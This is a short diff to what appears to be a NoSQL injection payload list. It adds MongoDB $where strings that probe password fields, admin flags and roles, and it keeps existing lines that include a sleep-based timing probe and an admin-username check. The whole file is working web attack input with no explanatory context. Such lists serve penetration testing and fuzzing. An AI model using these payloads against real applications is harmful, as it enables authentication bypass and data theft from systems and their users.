@@ -2,4 +2,8 @@
 {"$where":"this.password.length > 0"}
 {"$where":"this.username=='admin'"}
 {"$where":"sleep(5000)"}
-
+{"$where":"this.password.match(/.*/)"}
+{"$where":"this.passwordzz.match(/.*/)"}
+{"$where":"this.isAdmin==true"}
+{"$where":"this.role=='admin'"}
+{"$where":"this.username=='admin' && this.password.match(/.*/)"}
